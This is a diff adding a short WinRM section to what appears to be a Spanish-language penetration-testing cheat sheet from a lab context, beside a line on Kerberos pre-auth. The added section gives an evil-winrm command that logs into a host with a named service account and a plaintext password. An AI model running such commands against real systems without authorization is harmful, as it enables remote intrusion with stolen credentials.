@@ -2056,6 +2056,14 @@ ntpdate IPDC
 Para cuando tienes usuarios pero no contraseñas si no tienen habilitado el Pre Auth de Kerberos son vulnerables.
 
 
+## WinRm
+
+Puertos 5985 y 5986 siempre que veas estos puertos abiertos y tengas credenciales vale la pena intentarlo.
+
+```
+evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.95.241 
+
+```
 
 
 
